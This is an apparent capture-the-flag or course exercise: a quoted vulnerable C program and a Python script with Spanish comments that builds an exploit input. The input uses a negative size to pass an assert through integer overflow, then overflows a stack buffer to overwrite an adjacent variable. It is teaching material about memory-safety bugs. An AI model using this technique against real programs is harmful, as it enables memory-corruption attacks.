#include<assert.h>
#int #main(int argc, char*argv[]){
#    int size = 0;
#    int buf[1024];
#
#    read(0,&size,sizeof(size));
#    assert (size <= 1024);
#    read(0,buf,size*sizeof(int));
#
#    if (size > 0 && size < 100 && buf[999] == 'B')
#        printf("YOU WIN!\n");
#
#return 0;
#}

import struct 

with open('./04-challenge.win','wb') as win:		
	# size * sizeof(int) indica cuantos bytes de se van a escribir en buff
	# como queremos hacer overlow esto debe ser
	# size * sizeof(int) = buffer(1024 * 4) + size (1 * 4) 
	# size * 4 = 1025 * 4
	# size = 1025 (0x401 en hexa)

	# Pero como assert evalua que size <= 1024 hay que cambiar el primer bit a 1 
	# para que se interprete como negativo, 
	# 10000000 00000000 | 00000100 00000001 = 0x80000401
	# `---------------´ | `---------------´
	#	complemento 	| 		size
	read_buff_size = struct.pack('<L', 0x80000401)
	# Una vez definido el tamaño a leer ahora se completa buffer con 1024 'B' para cumplir 
	# con la condicion buf[999] == 'B'
	buffer = struct.pack('<L', ord('B')) * 1024
	# Al final se agrega el tamaño de size que debe estar entre 0 y 100
	size = struct.pack('<L', 50)
	win.write(read_buff_size + buffer + size)